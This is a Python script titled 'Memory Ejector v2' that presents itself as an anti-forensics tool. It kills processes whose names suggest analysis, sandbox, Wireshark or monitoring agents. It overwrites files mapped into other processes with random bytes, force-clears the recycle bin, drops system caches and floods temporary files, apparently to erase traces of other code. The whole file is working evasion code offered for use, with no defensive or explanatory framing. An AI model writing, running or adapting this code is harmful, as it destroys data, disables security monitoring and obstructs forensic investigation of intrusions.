# MINC - Memory Ejector v2 (RAM Shredder + Obfuscation + Anti-Forensics)

import os
import time
import mmap
import ctypes
import psutil
import platform
import threading
import random
import string
import tempfile
import sys

def shred_memory_region(size=4096, passes=3):
    try:
        for _ in range(passes):
            mem = mmap.mmap(-1, size)
            mem.write(os.urandom(size))
            mem.seek(0)
            mem.write(b"\x00" * size)
            mem.close()
    except:
        pass

def overwrite_loaded_modules():
    current_pid = os.getpid()
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['pid'] == current_pid:
            continue
        try:
            mem_info = proc.memory_maps()
            for region in mem_info:
                if "tmp" in region.path or "loader" in region.path or "memfd" in region.path:
                    try:
                        with open(region.path, "wb") as f:
                            f.write(os.urandom(1024))
                    except:
                        continue
        except:
            continue

def system_flush_cache():
    sys_type = platform.system().lower()
    if sys_type == "linux":
        os.system("sync; echo 3 > /proc/sys/vm/drop_caches 2>/dev/null")
    elif sys_type == "windows":
        os.system("PowerShell.exe Clear-RecycleBin -Force >nul 2>&1")
        os.system("PowerShell.exe [GC]::Collect() >nul 2>&1")
    elif sys_type == "darwin":
        os.system("purge >/dev/null 2>&1")

def randomize_ram(size=8192):
    junk = ''.join(random.choices(string.ascii_letters + string.digits, k=size))
    return junk.encode()

def passive_erase():
    for _ in range(10):
        shred_memory_region()
        if random.random() > 0.5:
            shred_memory_region(16384, 2)
        time.sleep(0.15)

def memory_floodmark():
    try:
        for _ in range(5):
            temp = tempfile.NamedTemporaryFile(delete=False)
            temp.write(b"X" * 512 + os.urandom(2048) + b"\x00" * 1024)
            temp.flush()
            temp.close()
            os.remove(temp.name)
    except:
        pass

def kill_suspicious_threads():
    for proc in psutil.process_iter(['pid', 'name']):
        pname = (proc.info['name'] or "").lower()
        if any(s in pname for s in ["analysis", "sandbox", "wireshark", "agent", "memory"]):
            try:
                proc.kill()
            except:
                continue

def run_ejector():
    print("[MemoryEjector] Launching high-entropy memory sanitization...")

    threads = []

    for _ in range(os.cpu_count() or 4):
        t = threading.Thread(target=passive_erase)
        t.start()
        threads.append(t)

    memory_floodmark()
    kill_suspicious_threads()
    overwrite_loaded_modules()
    system_flush_cache()

    for t in threads:
        t.join()

    print("[MemoryEjector] Volatile memory and loaded module data purged.")

if __name__ == "__main__":
    run_ejector()

